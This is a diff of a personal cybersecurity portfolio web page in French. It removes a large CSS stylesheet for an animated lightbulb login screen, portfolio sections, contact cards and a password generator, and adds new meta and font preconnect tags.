@@ -1,2637 +1,1628 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Elhoussayn Oubenmoussa - Cybersécurité</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
-    <style>
-        :root {
-            --primary: #e50914;
-            --secondary: #20a4f3;
-            --accent: #f7b731;
-            --background: 240 10% 3.9%;
-            --foreground: 0 0% 98%;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        .login-container {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
-            color: white;
-            font-family: 'Arial', sans-serif;
-            overflow: hidden;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            transition: background 0.7s ease-in-out;
-            animation: gradientShift 20s ease infinite;
-            background-size: 400% 400%;
-        }
-
-        @keyframes gradientShift {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        .anime-background {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1;
-            opacity: 0.4;
-        }
-
-        .anime-silhouette {
-            position: absolute;
-            background: linear-gradient(45deg, rgba(255,255,255,0.1), rgba(255,255,255,0.05));
-            border-radius: 10px;
-            animation: floatAnime 25s infinite ease-in-out;
-        }
-
-        .silhouette-1 {
-            width: 150px; height: 200px;
-            top: 10%; left: 5%;
-            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
-        }
-
-        .silhouette-2 {
-            width: 120px; height: 180px;
-            top: 60%; right: 8%;
-            clip-path: polygon(0% 0%, 100% 0%, 80% 100%, 20% 100%);
-        }
-
-        .silhouette-3 {
-            width: 140px; height: 190px;
-            bottom: 10%; left: 15%;
-            clip-path: polygon(25% 0%, 75% 0%, 100% 100%, 0% 100%);
-        }
-
-        .silhouette-4 {
-            width: 130px; height: 170px;
-            top: 20%; right: 20%;
-            clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
-        }
-
-        @keyframes floatAnime {
-            0%, 100% { 
-                transform: translateY(0px) rotate(0deg); 
-                opacity: 0.3;
-            }
-            25% { 
-                transform: translateY(-15px) rotate(2deg); 
-                opacity: 0.5;
-            }
-            50% { 
-                transform: translateY(0px) rotate(0deg); 
-                opacity: 0.3;
-            }
-            75% { 
-                transform: translateY(15px) rotate(-2deg); 
-                opacity: 0.5;
-            }
-        }
-
-        .manga-text {
-            position: absolute;
-            color: rgba(255,255,255,0.1);
-            font-size: 24px;
-            font-weight: bold;
-            font-family: 'Arial', sans-serif;
-            animation: textFloat 30s infinite linear;
-        }
-
-        .text-1 { top: 15%; left: 8%; animation-delay: 0s; }
-        .text-2 { top: 70%; right: 12%; animation-delay: 5s; }
-        .text-3 { bottom: 20%; left: 20%; animation-delay: 10s; }
-        .text-4 { top: 30%; right: 25%; animation-delay: 15s; }
-
-        @keyframes textFloat {
-            0% { transform: translateX(-100px) rotate(-5deg); opacity: 0; }
-            10% { opacity: 0.3; }
-            50% { transform: translateX(100px) rotate(5deg); opacity: 0.3; }
-            90% { opacity: 0; }
-            100% { transform: translateX(-100px) rotate(-5deg); opacity: 0; }
-        }
-
-        @keyframes swing {
-            0% { transform: rotate(3deg); }
-            100% { transform: rotate(-3deg); }
-        }
-
-        .swing-animation {
-            transform-origin: top center;
-            animation: swing 3s ease-in-out infinite alternate;
-        }
-
-        .bulb-on {
-            background: radial-gradient(circle at 60% 40%, 
-                rgba(255,255,255,0.9), 
-                #ffd700 40%, 
-                #ff6b35 80%);
-            box-shadow: 
-                0 0 80px 20px rgba(255,215,0,0.8),
-                0 0 160px 60px rgba(255,107,53,0.4),
-                0 0 240px 100px rgba(229,9,20,0.2),
-                inset 0 0 40px rgba(255,255,255,0.6);
-            filter: drop-shadow(0 0 30px #ffd700) 
-                    drop-shadow(0 0 60px #ff6b35);
-        }
-
-        .bulb-off {
-            background: radial-gradient(circle at 60% 40%, 
-                rgba(255,255,255,0.2), 
-                rgba(255,255,255,0.1) 40%, 
-                rgba(0,0,0,0.3) 80%);
-            opacity: 0.8;
-            box-shadow: 
-                inset 0 0 30px rgba(0,0,0,0.6),
-                0 0 40px rgba(255,255,255,0.1);
-        }
-
-        @keyframes flicker {
-            0%,100% { opacity: 1; }
-            50% { opacity: 0.9; }
-            52% { opacity: 0.7; }
-            54% { opacity: 0.9; }
-            56% { opacity: 1; }
-            58% { opacity: 0.8; }
-            60% { opacity: 1; }
-        }
-
-        .filament-on {
-            stroke: #fff;
-            stroke-width: 2.5;
-            filter: 
-                drop-shadow(0 0 8px #fff) 
-                drop-shadow(0 0 15px #ffd700)
-                drop-shadow(0 0 25px #ff6b35);
-            animation: flicker 3s infinite;
-        }
-
-        .filament-off {
-            stroke: #666;
-            stroke-width: 1;
-        }
-
-        .room-light {
-            position: absolute;
-            inset: 0;
-            background: radial-gradient(circle at 50% 30%, 
-                rgba(255,215,0,0.3), 
-                rgba(255,107,53,0.2) 40%,
-                rgba(229,9,20,0.15) 60%,
-                transparent 80%);
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.5s ease;
-        }
-
-        .room-light.on {
-            opacity: 1;
-        }
-
-        .login-pages {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 90%;
-            max-width: 400px;
-            opacity: 0;
-            transition: all 0.5s ease;
-            pointer-events: none;
-            z-index: 20;
-        }
-
-        .login-pages.show {
-            opacity: 1;
-            pointer-events: all;
-        }
-
-        .login-page {
-            background: linear-gradient(135deg, 
-                rgba(229, 9, 20, 0.9), 
-                rgba(32, 164, 243, 0.9),
-                rgba(247, 183, 49, 0.85));
-            padding: 40px;
-            border-radius: 20px;
-            color: white;
-            border: 3px solid rgba(255,255,255,0.4);
-            backdrop-filter: blur(15px);
-            position: relative;
-            box-shadow: 
-                0 20px 40px rgba(0, 0, 0, 0.5),
-                0 0 80px rgba(229, 9, 20, 0.4),
-                0 0 120px rgba(32, 164, 243, 0.3);
-            transform: perspective(1000px) rotateX(5deg) translateY(0);
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        .login-page::before {
-            content: '';
-            position: absolute;
-            top: -3px;
-            left: -3px;
-            right: -3px;
-            bottom: -3px;
-            background: linear-gradient(45deg, 
-                #e50914, #20a4f3, #f7b731, #2ecc71, #9b59b6);
-            border-radius: 23px;
-            z-index: -1;
-            opacity: 0;
-            transition: opacity 0.4s ease;
-            animation: borderGlow 4s ease-in-out infinite;
-        }
-
-        @keyframes borderGlow {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 0.7; }
-        }
-
-        .login-page:hover::before {
-            opacity: 0.8;
-        }
-
-        .login-page:hover {
-            transform: perspective(1000px) rotateX(2deg) translateY(-5px);
-            box-shadow: 
-                0 25px 50px rgba(0, 0, 0, 0.6),
-                0 0 100px rgba(229, 9, 20, 0.5),
-                0 0 150px rgba(32, 164, 243, 0.4);
-        }
-
-        .login-page h2 {
-            margin-bottom: 25px;
-            text-align: center;
-            color: white;
-            font-size: 32px;
-            font-weight: bold;
-            text-shadow: 
-                3px 3px 6px rgba(0,0,0,0.5), 
-                0 0 20px rgba(255,255,255,0.3),
-                0 0 30px rgba(255,215,0,0.4);
-            font-family: 'Arial', sans-serif;
-        }
-
-        .form-group {
-            margin-bottom: 25px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 12px;
-            color: white;
-            font-weight: bold;
-            font-size: 18px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-            font-family: 'Arial', sans-serif;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 16px;
-            border: 2px solid rgba(255,255,255,0.4);
-            border-radius: 12px;
-            font-size: 16px;
-            transition: all 0.3s;
-            background: rgba(255,255,255,0.2);
-            color: white;
-            box-shadow: inset 0 2px 8px rgba(0,0,0,0.3);
-            font-family: 'Arial', sans-serif;
-        }
-
-        .form-group input::placeholder {
-            color: rgba(255,255,255,0.8);
-            font-style: italic;
-        }
-
-        .form-group input:focus {
-            border-color: rgba(255,255,255,0.8);
-            outline: none;
-            background: rgba(255,255,255,0.3);
-            box-shadow: 
-                inset 0 2px 8px rgba(0,0,0,0.3),
-                0 0 25px rgba(255,255,255,0.4);
-            transform: translateY(-3px);
-        }
-
-        .login-btn {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, #e50914, #20a4f3);
-            color: white;
-            border: none;
-            border-radius: 15px;
-            font-size: 20px;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-weight: bold;
-            box-shadow: 0 8px 25px rgba(229, 9, 20, 0.5);
-            position: relative;
-            overflow: hidden;
-            font-family: 'Arial', sans-serif;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .login-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-            transition: left 0.6s;
-        }
-
-        .login-btn:hover::before {
-            left: 100%;
-        }
-
-        .login-btn:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 12px 35px rgba(32, 164, 243, 0.7);
-            background: linear-gradient(135deg, #20a4f3, #e50914);
-        }
-
-        .login-btn:active {
-            transform: translateY(-1px);
-        }
-
-        .hidden {
-            display: none !important;
-        }
-
-        .mode-bas-btn {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            background: linear-gradient(135deg, #e50914, #20a4f3);
-            color: white;
-            border: none;
-            padding: 14px 24px;
-            border-radius: 25px;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.4);
-            transition: all 0.3s ease;
-            z-index: 100;
-            font-family: 'Arial', sans-serif;
-        }
-
-        .mode-bas-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 30px rgba(229, 9, 20, 0.5);
-        }
-
-        .battery-circle {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            width: 60px;
-            height: 60px;
-            background: radial-gradient(circle, #e50914, #20a4f3);
-            border-radius: 50%;
-            box-shadow: 0 0 25px #e50914, 0 0 50px rgba(32, 164, 243, 0.6);
-            opacity: 0;
-            transition: all 0.5s ease;
-            z-index: 100;
-        }
-
-        .battery-circle.show {
-            opacity: 1;
-        }
-
-        #hint {
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.6);
-            font-size: 20px;
-            background: rgba(0,0,0,0.4);
-            padding: 15px 30px;
-            border-radius: 25px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.2);
-            font-family: 'Arial', sans-serif;
-            font-weight: bold;
-        }
-
-        .anime-title {
-            position: absolute;
-            top: 30px;
-            left: 30px;
-            color: rgba(255,255,255,0.7);
-            font-size: 14px;
-            font-style: italic;
-            z-index: 100;
-        }
-
-        /* Portfolio Styles */
-        .portfolio-section {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
-            z-index: 1000;
-            overflow-y: auto;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        .portfolio-section.active {
-            display: block;
-        }
-
-        .portfolio-page {
-            display: none;
-            min-height: 100vh;
-            padding-top: 80px;
-        }
-
-        .portfolio-page.active {
-            display: block;
-        }
-
-        .project-detail-page {
-            display: none;
-            min-height: 100vh;
-            padding-top: 80px;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
-        }
-
-        .project-detail-page.active {
-            display: block;
-        }
-
-        .anime-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: 
-                radial-gradient(circle at 20% 80%, rgba(229, 9, 20, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(32, 164, 243, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 40% 40%, rgba(247, 183, 49, 0.08) 0%, transparent 50%);
-            z-index: -1;
-        }
-
-        .navbar {
-            background: rgba(0, 0, 0, 0.9);
-            backdrop-filter: blur(10px);
-            border-bottom: 2px solid var(--primary);
-        }
-
-        .nav-btn {
-            background: transparent;
-            border: 2px solid transparent;
-            padding: 10px 20px;
-            border-radius: 25px;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin: 0 5px;
-        }
-
-        .nav-btn:hover, .nav-btn.active {
-            background: var(--primary);
-            border-color: var(--accent);
-            transform: translateY(-2px);
-        }
-
-        .hero-section {
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .hero-content {
-            position: relative;
-            z-index: 2;
-        }
-
-        .hero-title {
-            font-size: 4rem;
-            font-weight: bold;
-            background: linear-gradient(45deg, var(--primary), var(--secondary), var(--accent));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 30px rgba(229, 9, 20, 0.5);
-        }
-
-        .skill-card {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 15px;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .skill-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
-            border-color: var(--primary);
-        }
-
-        .project-card {
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0.05));
-            border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            transition: all 0.3s ease;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .project-card:hover {
-            transform: translateY(-10px) scale(1.02);
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.4);
-        }
-
-        .contact-btn {
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
-            border: none;
-            padding: 15px 30px;
-            border-radius: 25px;
-            color: white;
-            font-weight: bold;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .contact-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(229, 9, 20, 0.4);
-        }
-
-        .social-icon {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: rgba(255, 255, 255, 0.1);
-            border: 2px solid transparent;
-            transition: all 0.3s ease;
-        }
-
-        .social-icon:hover {
-            background: var(--primary);
-            transform: translateY(-5px) rotate(360deg);
-            border-color: var(--accent);
-        }
-
-        .glow-text {
-            text-shadow: 0 0 10px currentColor, 0 0 20px currentColor, 0 0 30px currentColor;
-        }
-
-        .floating {
-            animation: floating 3s ease-in-out infinite;
-        }
-
-        @keyframes floating {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(50px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .animate-fade-in-up {
-            animation: fadeInUp 0.8s ease-out;
-        }
-
-        .page-title {
-            font-size: 3.5rem;
-            font-weight: bold;
-            text-align: center;
-            margin-bottom: 3rem;
-            background: linear-gradient(45deg, var(--primary), var(--secondary), var(--accent));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .contact-card {
-            background: linear-gradient(135deg, 
-                rgba(255, 255, 255, 0.1), 
-                rgba(255, 255, 255, 0.05));
-            backdrop-filter: blur(15px);
-            border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 
-                0 20px 40px rgba(0, 0, 0, 0.3),
-                0 0 80px rgba(229, 9, 20, 0.2);
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .contact-card::before {
-            content: '';
-            position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            background: linear-gradient(45deg, 
-                #e50914, #20a4f3, #f7b731, #2ecc71, #9b59b6);
-            border-radius: 22px;
-            z-index: -1;
-            opacity: 0;
-            transition: opacity 0.4s ease;
-            animation: borderGlow 4s ease-in-out infinite;
-        }
-
-        .contact-card:hover::before {
-            opacity: 0.8;
-        }
-
-        .contact-card:hover {
-            transform: translateY(-10px) scale(1.02);
-            box-shadow: 
-                0 25px 50px rgba(0, 0, 0, 0.4),
-                0 0 100px rgba(229, 9, 20, 0.3);
-        }
-
-        .contact-item {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            transition: all 0.3s ease;
-        }
-
-        .contact-item:hover {
-            background: rgba(255, 255, 255, 0.1);
-            transform: translateY(-3px);
-            border-color: var(--primary);
-        }
-
-        .gradient-bg {
-            background: linear-gradient(135deg, 
-                rgba(229, 9, 20, 0.1), 
-                rgba(32, 164, 243, 0.1),
-                rgba(247, 183, 49, 0.1));
-        }
-
-        .contact-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 2rem;
-            margin-top: 2rem;
-        }
-
-        .contact-header {
-            text-align: center;
-            margin-bottom: 3rem;
-        }
-
-        .contact-header h2 {
-            font-size: 3.5rem;
-            font-weight: bold;
-            background: linear-gradient(45deg, var(--primary), var(--secondary), var(--accent));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 1rem;
-        }
-
-        .contact-header p {
-            font-size: 1.2rem;
-            color: rgba(255, 255, 255, 0.7);
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .service-card {
-            background: linear-gradient(135deg, 
-                rgba(255, 255, 255, 0.08), 
-                rgba(255, 255, 255, 0.03));
-            border-radius: 15px;
-            padding: 2rem;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            transition: all 0.3s ease;
-            text-align: center;
-        }
-
-        .service-card:hover {
-            transform: translateY(-5px);
-            border-color: var(--accent);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
-        }
-
-        .service-icon {
-            font-size: 3rem;
-            margin-bottom: 1rem;
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .social-section {
-            text-align: center;
-            margin-top: 3rem;
-            padding: 2rem;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .social-links {
-            display: flex;
-            justify-content: center;
-            gap: 2rem;
-            margin-top: 1.5rem;
-        }
-
-        .social-link {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-decoration: none;
-            color: white;
-            transition: all 0.3s ease;
-        }
-
-        .social-link:hover {
-            transform: translateY(-5px);
-        }
-
-        .social-link i {
-            font-size: 2.5rem;
-            margin-bottom: 0.5rem;
-            transition: all 0.3s ease;
-        }
-
-        .social-link:hover i {
-            transform: scale(1.2);
-        }
-
-        .instagram:hover i {
-            color: #E1306C;
-        }
-
-        .discord:hover i {
-            color: #5865F2;
-        }
-
-        .profile-image {
-            width: 200px;
-            height: 200px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 4px solid var(--primary);
-            box-shadow: 0 0 30px rgba(229, 9, 20, 0.5);
-            transition: all 0.3s ease;
-        }
-
-        .profile-image:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 50px rgba(229, 9, 20, 0.7);
-        }
-
-        .project-header {
-            background: linear-gradient(135deg, rgba(229, 9, 20, 0.2), rgba(32, 164, 243, 0.2));
-            padding: 4rem 0;
-            text-align: center;
-            margin-bottom: 3rem;
-        }
-
-        .project-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 2rem;
-        }
-
-        .project-section {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 2rem;
-            margin-bottom: 2rem;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .tech-stack {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 1rem;
-            margin: 1.5rem 0;
-        }
-
-        .tech-badge {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
-            padding: 0.5rem 1rem;
-            border-radius: 20px;
-            font-size: 0.9rem;
-            font-weight: bold;
-        }
-
-        .feature-list {
-            list-style: none;
-            padding: 0;
-        }
-
-        .feature-list li {
-            padding: 0.5rem 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            display: flex;
-            align-items: center;
-        }
-
-        .feature-list li:before {
-            content: "✓";
-            color: var(--accent);
-            font-weight: bold;
-            margin-right: 1rem;
-        }
-
-        .back-btn {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 25px;
-            cursor: pointer;
-            margin-bottom: 2rem;
-            transition: all 0.3s ease;
-        }
-
-        .back-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(229, 9, 20, 0.4);
-        }
-
-        .education-timeline {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 2rem;
-            margin: 2rem 0;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .timeline-item {
-            padding: 1rem;
-            margin: 1rem 0;
-            border-left: 3px solid var(--primary);
-            background: rgba(255, 255, 255, 0.02);
-        }
-
-        .development-plan {
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.03));
-            border-radius: 15px;
-            padding: 2rem;
-            margin: 2rem 0;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .plan-steps {
-            display: grid;
-            gap: 1.5rem;
-            margin-top: 1.5rem;
-        }
-
-        .step {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            padding: 1rem;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-        }
-
-        .step-number {
-            width: 40px;
-            height: 40px;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-        }
-
-        /* أنماط جديدة لمولد كلمات السر */
-        .password-generator {
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0.05));
-            border-radius: 15px;
-            padding: 2rem;
-            margin: 2rem 0;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .password-display {
-            background: rgba(255, 255, 255, 0.1);
-            border: 2px solid var(--primary);
-            border-radius: 10px;
-            padding: 1rem;
-            font-family: 'Courier New', monospace;
-            font-size: 1.2rem;
-            text-align: center;
-            margin: 1rem 0;
-            position: relative;
-            min-height: 60px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            word-break: break-all;
-        }
-
-        .strength-meter {
-            height: 8px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 4px;
-            margin: 1rem 0;
-            overflow: hidden;
-        }
-
-        .strength-fill {
-            height: 100%;
-            transition: all 0.3s ease;
-        }
-
-        .strength-weak { background: #e50914; width: 25%; }
-        .strength-medium { background: #f7b731; width: 50%; }
-        .strength-strong { background: #2ecc71; width: 75%; }
-        .strength-very-strong { background: #27ae60; width: 100%; }
-
-        .options-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 1rem;
-            margin: 1.5rem 0;
-        }
-
-        .option-item {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .copy-btn {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
-            border: none;
-            padding: 0.5rem 1rem;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .copy-btn:hover {
-            transform: translateY(-2px);
-        }
-
-        .password-history {
-            margin-top: 2rem;
-        }
-
-        .history-item {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 0.5rem 1rem;
-            margin: 0.5rem 0;
-            border-radius: 5px;
-            border-left: 3px solid var(--accent);
-            font-family: 'Courier New', monospace;
-            word-break: break-all;
-        }
-
-        .project-detail-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 2rem;
-        }
-
-        .project-feature-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-            margin: 2rem 0;
-        }
-
-        .feature-card {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 1.5rem;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            transition: all 0.3s ease;
-        }
-
-        .feature-card:hover {
-            transform: translateY(-5px);
-            border-color: var(--primary);
-        }
-
-        .demo-section {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 2rem;
-            margin: 2rem 0;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .code-snippet {
-            background: #1e1e1e;
-            border-radius: 10px;
-            padding: 1.5rem;
-            font-family: 'Courier New', monospace;
-            color: #d4d4d4;
-            overflow-x: auto;
-            margin: 1rem 0;
-        }
-
-        /* تحسينات للهواتف */
-        @media (max-width: 768px) {
-            .login-container {
-                overflow-y: auto;
-            }
-            
-            .login-pages {
-                width: 95%;
-                max-width: 350px;
-                padding: 10px;
-            }
-            
-            .login-page {
-                padding: 25px 20px;
-            }
-            
-            .login-page h2 {
-                font-size: 24px;
-                margin-bottom: 20px;
-            }
-            
-            .form-group input {
-                padding: 14px;
-                font-size: 16px;
-            }
-            
-            .login-btn {
-                padding: 16px;
-                font-size: 18px;
-            }
-            
-            #bulbWrapper {
-                margin-top: 20px;
-            }
-            
-            #bulb {
-                width: 120px;
-                height: 120px;
-            }
-            
-            .w-1.h-\[30vh\] {
-                height: 20vh;
-            }
-            
-            #hint {
-                font-size: 16px;
-                padding: 12px 20px;
-                bottom: 30px;
-                text-align: center;
-                width: 90%;
-                left: 5%;
-            }
-            
-            .mode-bas-btn {
-                padding: 12px 18px;
-                font-size: 14px;
-                top: 15px;
-                right: 15px;
-            }
-            
-            .anime-title {
-                top: 15px;
-                left: 15px;
-                font-size: 12px;
-            }
-            
-            .navbar .container {
-                padding-left: 15px;
-                padding-right: 15px;
-                flex-direction: column;
-                gap: 10px;
-            }
-            
-            .navbar .text-2xl {
-                font-size: 18px;
-            }
-            
-            .nav-btn {
-                padding: 8px 12px;
-                font-size: 12px;
-                margin: 2px;
-            }
-            
-            .portfolio-page {
-                padding-top: 120px;
-            }
-            
-            .hero-title {
-                font-size: 2.5rem;
-            }
-            
-            .page-title {
-                font-size: 2.5rem;
-            }
-            
-            .grid {
-                grid-template-columns: 1fr !important;
-            }
-            
-            .contact-grid {
-                grid-template-columns: 1fr;
-                gap: 1rem;
-            }
-            
-            .md\:grid-cols-2, 
-            .lg\:grid-cols-3, 
-            .lg\:grid-cols-4 {
-                grid-template-columns: 1fr;
-            }
-            
-            .skill-card, 
-            .project-card, 
-            .service-card {
-                padding: 1.5rem;
-            }
-            
-            .hero-content .text-xl {
-                font-size: 1.1rem;
-            }
-            
-            .container.mx-auto.px-6 {
-                padding-left: 15px;
-                padding-right: 15px;
-            }
-            
-            .py-20 {
-                padding-top: 3rem;
-                padding-bottom: 3rem;
-            }
-            
-            .profile-image {
-                width: 150px;
-                height: 150px;
-            }
-            
-            .contact-btn {
-                padding: 12px 20px;
-                font-size: 14px;
-            }
-            
-            .flex.gap-4 {
-                flex-direction: column;
-                gap: 1rem;
-            }
-            
-            .social-links {
-                flex-wrap: wrap;
-                gap: 1rem;
-            }
-            
-            .anime-silhouette {
-                display: none;
-            }
-            
-            .manga-text {
-                display: none;
-            }
-        }
-        
-        @media (max-width: 480px) {
-            .login-page {
-                padding: 20px 15px;
-            }
-            
-            .hero-title {
-                font-size: 2rem;
-            }
-            
-            .page-title {
-                font-size: 2rem;
-            }
-            
-            .profile-image {
-                width: 120px;
-                height: 120px;
-            }
-            
-            .nav-btn {
-                padding: 6px 10px;
-                font-size: 11px;
-            }
-            
-            .portfolio-page {
-                padding-top: 140px;
-            }
-        }
-        
-        @media (max-height: 500px) and (orientation: landscape) {
-            .login-container {
-                overflow-y: auto;
-            }
-            
-            #bulbWrapper {
-                margin-top: 10px;
-            }
-            
-            #hint {
-                position: relative;
-                bottom: auto;
-                margin-top: 20px;
-            }
-            
-            .login-pages {
-                margin-top: 20px;
-                margin-bottom: 20px;
-            }
-        }
-        
-        img {
-            max-width: 100%;
-            height: auto;
-        }
-        
-        input, select, textarea {
-            font-size: 16px;
-        }
-        
-        button, .nav-btn, .login-btn, .contact-btn {
-            cursor: pointer;
-            -webkit-tap-highlight-color: transparent;
-        }
-        
-        .navbar {
-            position: fixed;
-            top: 0;
-            width: 100%;
-            z-index: 1000;
-        }
-        
-        .safe-area-padding {
-            padding-top: env(safe-area-inset-top);
-            padding-bottom: env(safe-area-inset-bottom);
-            padding-left: env(safe-area-inset-left);
-            padding-right: env(safe-area-inset-right);
-        }
-    </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+<meta name="theme-color" content="#08090a" />
+<title>Elhoussayn Oubenmoussa — Cybersécurité</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
